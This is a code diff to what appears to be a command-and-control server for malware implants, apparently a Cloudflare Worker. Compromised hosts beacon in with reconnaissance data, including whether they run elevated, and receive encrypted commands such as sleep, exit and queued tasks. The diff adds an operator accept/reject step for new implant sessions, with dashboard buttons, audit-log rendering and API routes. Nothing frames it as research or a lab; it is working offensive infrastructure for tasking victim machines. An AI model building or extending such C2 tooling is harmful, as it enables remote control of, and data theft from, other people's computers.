@@ -35,6 +35,7 @@ interface SessionData {
   recon: Record<string, unknown>;
   pending_tasks: number;
   result_count: number;
+  status: "pending" | "accepted" | "rejected";
 }
 
 interface ResultEntry {
@@ -406,6 +407,10 @@ async function handleBeacon(request: Request, env: Env): Promise<Response> {
   }
 
   const existing = await getSession(env.GHOST_KV, sid);
+
+  // New session starts as pending — operator must accept before tasks flow
+  const status: SessionData["status"] = existing?.status ?? "pending";
+
   const session: SessionData = {
     session: sid,
     remote_ip: ip,
@@ -414,8 +419,25 @@ async function handleBeacon(request: Request, env: Env): Promise<Response> {
     recon: recon,
     pending_tasks: existing?.pending_tasks ?? 0,
     result_count: existing?.result_count ?? 0,
+    status,
   };
   await putSession(env.GHOST_KV, sid, session, ttl);
+
+  // Rejected sessions get exit; pending sessions sleep until accepted
+  if (status === "rejected") {
+    const plainResponse = JSON.stringify({ cmd: "exit" });
+    const encryptedResponse = await encryptAesGcm(keyBytes, plainResponse);
+    await logAudit(env.GHOST_KV, { ts, action: "beacon_rejected", ip, detail: { sid } });
+    return jsonResponse({ enc: encryptedResponse });
+  }
+
+  if (status === "pending") {
+    console.log(`[beacon] sid=${sid} ip=${ip} PENDING (awaiting operator accept)`);
+    await logAudit(env.GHOST_KV, { ts, action: "beacon", ip, detail: { sid, status: "pending" } });
+    const plainResponse = JSON.stringify({ cmd: "sleep" });
+    const encryptedResponse = await encryptAesGcm(keyBytes, plainResponse);
+    return jsonResponse({ enc: encryptedResponse });
+  }
 
   const tasks = await getTasks(env.GHOST_KV, sid);
   let cmd = "sleep";
@@ -497,6 +519,7 @@ async function handleListSessions(request: Request, env: Env): Promise<Response>
       recon: data.recon,
       pending_tasks: data.pending_tasks ?? 0,
       result_count: data.result_count ?? 0,
+      status: data.status ?? "pending",
     });
   }
 
@@ -877,11 +900,16 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
 .audit-entry.kill_session::before{background:var(--red)}
 .audit-entry.payload_uploaded::before{background:var(--orange)}
 .audit-entry.beacon::before{background:var(--accent)}
-.a-time{color:var(--muted);letter-spacing:.02em;font-size:8px}
-.a-action{color:var(--text);font-weight:700;letter-spacing:.08em;text-transform:uppercase;font-size:9px}
-.a-detail{color:var(--muted);font-size:8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.a-ip{color:var(--muted2);font-size:8px}
-.no-audit{padding:28px 14px;color:var(--muted);font-size:9px;letter-spacing:.06em;text-align:center}
+.a-time{color:var(--text2);letter-spacing:.02em;font-size:9px;font-variant-numeric:tabular-nums}
+.a-action{font-weight:700;letter-spacing:.08em;text-transform:uppercase;font-size:10px}
+.a-sid{color:var(--accent);font-size:9px;letter-spacing:.02em;word-break:break-all;margin-top:1px}
+.a-ip{color:var(--text2);font-size:9px;margin-top:1px}
+.a-btns{display:flex;gap:4px;margin-top:5px}
+.a-accept{background:transparent;border:1px solid rgba(0,232,122,.4);color:var(--accent);padding:2px 10px;font-family:var(--mono);font-size:9px;letter-spacing:.1em;cursor:pointer;text-transform:uppercase;transition:all .15s}
+.a-accept:hover{background:rgba(0,232,122,.15)}
+.a-reject{background:transparent;border:1px solid rgba(255,59,92,.4);color:var(--red);padding:2px 10px;font-family:var(--mono);font-size:9px;letter-spacing:.1em;cursor:pointer;text-transform:uppercase;transition:all .15s}
+.a-reject:hover{background:rgba(255,59,92,.15)}
+.no-audit{padding:28px 14px;color:var(--text2);font-size:10px;letter-spacing:.06em;text-align:center}
 #toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%);background:var(--surface2);border:1px solid var(--border);padding:9px 22px;font-size:11px;letter-spacing:.06em;opacity:0;transition:opacity .2s;pointer-events:none;z-index:9998;white-space:nowrap}
 #toast.show{opacity:1}
 #toast.ok{border-color:rgba(0,232,122,.5);color:var(--accent)}
@@ -1044,8 +1072,9 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
     sessions.sort((a,b)=>new Date(b.last_beacon)-new Date(a.last_beacon));
     list.innerHTML = sessions.map(s=>{
       const idle=s.idle_seconds||0, stale=idle>180;
-      const bc=s.pending_tasks>0?'tasks':stale?'stale':'live';
-      const btLabel=s.pending_tasks>0?('&#x25B3; '+s.pending_tasks+' QUEUED'):stale?('STALE '+fmt(idle)):('&#x25CF; LIVE '+fmt(idle));
+      const sessionStatus=s.status||'pending';
+      const bc=sessionStatus==='pending'?'stale':sessionStatus==='rejected'?'stale':s.pending_tasks>0?'tasks':stale?'stale':'live';
+      const btLabel=sessionStatus==='pending'?'&#x23F3; PENDING':sessionStatus==='rejected'?'&#x2715; REJECTED':s.pending_tasks>0?('&#x25B3; '+s.pending_tasks+' QUEUED'):stale?('STALE '+fmt(idle)):('&#x25CF; LIVE '+fmt(idle));
       const isAdmin=s.recon?.elevated;
       return \`<div class="session-item\${s.session===selectedSid?' active':''}" onclick="selectSession('\${esc(s.session)}')">
         <div class="si-top">
@@ -1207,21 +1236,45 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
   }
   window.killSession = killSession;
 
+  const ac={task_queued:'var(--yellow)',kill_session:'var(--red)',get_results:'var(--blue)',
+            beacon:'var(--accent)',beacon_rejected:'var(--red)',
+            session_accepted:'var(--accent)',session_rejected:'var(--red)',
+            payload_uploaded:'var(--orange)',payload_downloaded:'var(--orange)',
+            list_sessions:'var(--muted2)',get_results2:'var(--blue)'};
+
+  async function acceptSession(sid) {
+    await api('/sessions/'+encodeURIComponent(sid)+'/accept',{method:'POST'});
+    toast('SESSION ACCEPTED'); fetchAudit(); refreshSessions();
+  }
+  async function rejectSession(sid) {
+    await api('/sessions/'+encodeURIComponent(sid)+'/reject',{method:'POST'});
+    toast('SESSION REJECTED','warn'); fetchAudit(); refreshSessions();
+  }
+  window.acceptSession = acceptSession;
+  window.rejectSession = rejectSession;
+
   async function fetchAudit() {
-    const r=await api('/audit?limit=150'); if (!r) return;
+    const r=await api('/audit?limit=200'); if (!r) return;
     const data=await r.json();
     const list=document.getElementById('audit-list');
     const entries=(data.entries||[]).slice().reverse();
     if (!entries.length){list.innerHTML='<div class="no-audit">NO ENTRIES</div>';return;}
-    const ac={task_queued:'var(--yellow)',kill_session:'var(--red)',get_results:'var(--blue)',beacon:'var(--accent)',payload_uploaded:'var(--orange)',list_sessions:'var(--muted)'};
     list.innerHTML=entries.map(e=>{
-      const t=e.ts.replace('T',' ').slice(0,19);
-      const detail=e.detail?Object.entries(e.detail).map(([k,v])=>k+':'+v).join(' '):'';
-      return \`<div class="audit-entry \${esc(e.action)}">
-        <div class="a-time">\${t}</div>
-        <div class="a-action" style="color:\${ac[e.action]||'var(--muted)'}">\${esc(e.action).replace(/_/g,' ')}</div>
-        \${detail?'<div class="a-detail">'+esc(detail)+'</div>':''}
+      const t=new Date(e.ts).toLocaleString('en-US',{
+        timeZone:'Asia/Kathmandu',hour12:true,
+        month:'short',day:'2-digit',hour:'numeric',minute:'2-digit',second:'2-digit'
+      });
+      const action=e.action||'';
+      const color=ac[action]||'var(--text2)';
+      const label=action.replace(/_/g,' ').toUpperCase();
+      const sid=e.detail?.sid||'';
+      const isPending=action==='beacon'&&e.detail?.status==='pending';
+      return \`<div class="audit-entry \${esc(action)}">
+        <div class="a-time">\${t} NPT</div>
+        <div class="a-action" style="color:\${color}">\${esc(label)}</div>
+        \${sid?'<div class="a-sid">'+esc(sid)+'</div>':''}
         <div class="a-ip">\${esc(e.ip)}</div>
+        \${isPending?'<div class="a-btns"><button class="a-accept" onclick="acceptSession('+JSON.stringify(sid)+')">ACCEPT</button><button class="a-reject" onclick="rejectSession('+JSON.stringify(sid)+')">REJECT</button></div>':''}
       </div>\`;
     }).join('');
   }
@@ -1382,6 +1435,32 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
     if (authErr) return withCORS(authErr, env);
     const sid = decodeURIComponent(sessionsMatch[1]);
     return withCORS(await handleKillSession(request, env, sid), env);
+  }
+
+  const acceptMatch = path.match(/^\/sessions\/(.+)\/accept$/);
+  if (acceptMatch && method === "POST") {
+    const authErr = requireOperatorToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    const sid = decodeURIComponent(acceptMatch[1]);
+    const session = await getSession(env.GHOST_KV, sid);
+    if (!session) return withCORS(errorResponse("Session not found", 404), env);
+    session.status = "accepted";
+    await putSession(env.GHOST_KV, sid, session, getSessionTTL(env));
+    await logAudit(env.GHOST_KV, { ts: now(), ip: getClientIP(request), action: "session_accepted", detail: { sid } });
+    return withCORS(jsonResponse({ status: "accepted" }), env);
+  }
+
+  const rejectMatch = path.match(/^\/sessions\/(.+)\/reject$/);
+  if (rejectMatch && method === "POST") {
+    const authErr = requireOperatorToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    const sid = decodeURIComponent(rejectMatch[1]);
+    const session = await getSession(env.GHOST_KV, sid);
+    if (!session) return withCORS(errorResponse("Session not found", 404), env);
+    session.status = "rejected";
+    await putSession(env.GHOST_KV, sid, session, getSessionTTL(env));
+    await logAudit(env.GHOST_KV, { ts: now(), ip: getClientIP(request), action: "session_rejected", detail: { sid } });
+    return withCORS(jsonResponse({ status: "rejected" }), env);
   }
 
   return withCORS(errorResponse("Not found", 404), env);
